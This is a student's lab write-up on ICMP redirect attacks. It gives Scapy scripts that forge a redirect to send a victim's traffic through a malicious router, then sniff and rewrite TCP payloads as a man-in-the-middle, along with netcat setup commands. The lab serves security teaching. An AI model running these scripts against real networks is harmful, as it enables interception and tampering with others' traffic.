# ICMP Redirect Lab

## Fei Guo, July 16, 2022

### Task 1: Launching ICMP Redirect Attack

This script will change the ip route cache on machine "10.9.0.5" for router "10.9.0.11" to malicious router'10.9.0.111', which can be used for MITM attack. Note this has to be run on a machine in a LAN, otherwise the router will drop it with the reverse path forward mechanism.
```
from scapy.all import *
ip = IP(src = '10.9.0.11',  dst = '10.9.0.5')
icmp = ICMP(type=5, code=0)
icmp.gw = '10.9.0.111'
# The enclosed IP packet should be the one that
# triggers the redirect message.
ip2 = IP(src = '10.9.0.5', dst = '10.9.0.11')
send(ip/icmp/ip2/ICMP());
```

### Task 2: Launching the MITM Attack

On the destination container 192.168.60.5, start the netcat server:
`nc -lp 9090`

On the victim container, connect to the server:
`nc 192.168.60.5 9090`

Disabling IP Forwarding on the malicious router:
`sysctl net.ipv4.ip_forward=0`

Then run this on the malicious router:
```
#!/usr/bin/env python3
from scapy.all import *

print("LAUNCHING MITM ATTACK.........")

def spoof_pkt(pkt):
   newpkt = IP(bytes(pkt[IP]))
   del(newpkt.chksum)
   del(newpkt[TCP].payload)
   del(newpkt[TCP].chksum)

   if pkt[TCP].payload:
       data = pkt[TCP].payload.load
       print("*** %s, length: %d" % (data, len(data)))

       # Replace a pattern
       newdata = data.replace(b'fei', b'AAA')

       send(newpkt/newdata)
   else:
       send(newpkt)

f = 'tcp and port 9090 and ether src not '
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```